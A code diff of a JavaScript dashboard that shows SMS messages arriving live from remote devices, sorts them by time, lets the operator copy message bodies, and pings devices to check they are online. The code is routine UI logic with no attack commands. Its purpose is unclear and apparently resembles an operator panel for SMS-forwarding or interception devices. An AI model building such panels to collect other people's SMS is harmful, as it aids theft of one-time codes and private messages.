-// ✅ UPDATED: addMessageCard function with sorted insertion
 function addMessageCard(message, isBatchRender = false) {
   const container = deviceMessagesList;
   if (!container) return;
@@ -3349,7 +3451,6 @@ function addMessageCard(message, isBatchRender = false) {
       </div>
     </div>
     
-    <!-- Device info row - REMOVED DEVICE ID COLUMN -->
     <div class="device-info-row">
       <div class="device-info-item">
         <i class="fas fa-user-tag"></i>
@@ -3367,7 +3468,6 @@ function addMessageCard(message, isBatchRender = false) {
       </div>
     </div>
     
-    <!-- Message body -->
     <div class="msg-body-container">
       <div class="msg-body-header">
         <div style="font-size: 14px; color: var(--gray-600); font-weight: 700;">
@@ -3382,7 +3482,6 @@ function addMessageCard(message, isBatchRender = false) {
       </div>
     </div>
     
-    <!-- Footer -->
     <div class="message-footer">
       <div class="message-time">
         <i class="fas fa-clock"></i>
@@ -3401,7 +3500,6 @@ function addMessageCard(message, isBatchRender = false) {
     </div>
   `;
 
-  // Message card click - toggle expand/collapse
   card.addEventListener('click', function(e) {
     if (e.target.closest('.copy-btn') || e.target.closest('.message-body-display')) {
       return;
@@ -3409,7 +3507,6 @@ function addMessageCard(message, isBatchRender = false) {
     this.classList.toggle('expanded');
   });
 
-  // Copy button click
   const copyBtn = card.querySelector(".copy-btn");
   if (copyBtn) {
     copyBtn.addEventListener("click", function(e) {
@@ -3419,7 +3516,6 @@ function addMessageCard(message, isBatchRender = false) {
     });
   }
 
-  // Message body click - copy
   const messageDisplay = card.querySelector(".message-body-display");
   if (messageDisplay) {
     messageDisplay.addEventListener("click", function(e) {
@@ -3428,14 +3524,11 @@ function addMessageCard(message, isBatchRender = false) {
     });
   }
   
-  // ✅ FIXED: Insert message in correct position based on timestamp
   const messageTime = getTimestampFromSms(message);
   
   if (isBatchRender) {
-    // Batch rendering - just append
     container.appendChild(card);
   } else {
-    // Live SMS - insert at correct position
     const cards = Array.from(container.children);
     let insertIndex = 0;
     
@@ -3455,7 +3548,6 @@ function addMessageCard(message, isBatchRender = false) {
   }
 }
 
-// Helper function to get timestamp from card
 function getTimestampFromCard(card) {
   const dateElement = card.querySelector('.message-date');
   if (dateElement) {
@@ -3925,6 +4017,9 @@ function startLastSeenTimer() {
 
 // ===================== CHECK ONLINE FUNCTIONS WITH AUTH =====================
 async function checkOnline(uid) {
+  // Update last check time
+  lastCheckOnlineTime = Date.now();
+  
   currentReplyUid = uid;
   showCheckPopup();
   startCountdown();
@@ -4035,12 +4130,19 @@ function handleCountdownEnd() {
   addHistoryEntry(historyEntry);
 }
 
+// FIXED: Device Online Status Check - Only show "Device is Online" for recent replies (within last 2 minutes)
 function checkForDeviceOnlineReply(data, message) {
+  // Check if this is a recent reply (within last 2 minutes)
+  if (lastCheckOnlineTime && (Date.now() - lastCheckOnlineTime > 120000)) {
+    return false; // Reply is too old (more than 2 minutes)
+  }
+  
   if (data && data.available) {
     const availableStr = String(data.available).toLowerCase().trim();
     if (availableStr.includes("device is online") || 
         availableStr.includes("device online") ||
-        availableStr.includes("online device")) {
+        availableStr.includes("online device") ||
+        availableStr.includes("available")) {
       return true;
     }
   }
@@ -4049,7 +4151,8 @@ function checkForDeviceOnlineReply(data, message) {
     const messageStr = String(message).toLowerCase().trim();
     if (messageStr.includes("device is online") || 
         messageStr.includes("device online") ||
-        messageStr.includes("online device")) {
+        messageStr.includes("online device") ||
+        messageStr.includes("available")) {
       return true;
     }
   }
@@ -4311,14 +4414,12 @@ function handleLiveSMS(data) {
 
   const exists = allSmsData.some(sms => sms.id === smsId);
   if (!exists) {
-    // ✅ FIXED: Insert at beginning of array (top position)
     allSmsData.unshift(newSms); 
     
-    // ✅ FIXED: Maintain sorting by timestamp
     allSmsData.sort((a, b) => {
       const timeA = getTimestampFromSms(a);
       const timeB = getTimestampFromSms(b);
-      return timeB - timeA; // Descending order (newest first)
+      return timeB - timeA;
     });
     
     liveSmsCount++;
@@ -4326,7 +4427,6 @@ function handleLiveSMS(data) {
   
   updateNotificationBadge(liveSmsCount);
 
-  // ✅ FIXED: Re-render all messages with proper sorting
   renderAllMessagesSorted();
   
   showToast(`📩 New SMS from ${sender}`, 'live');
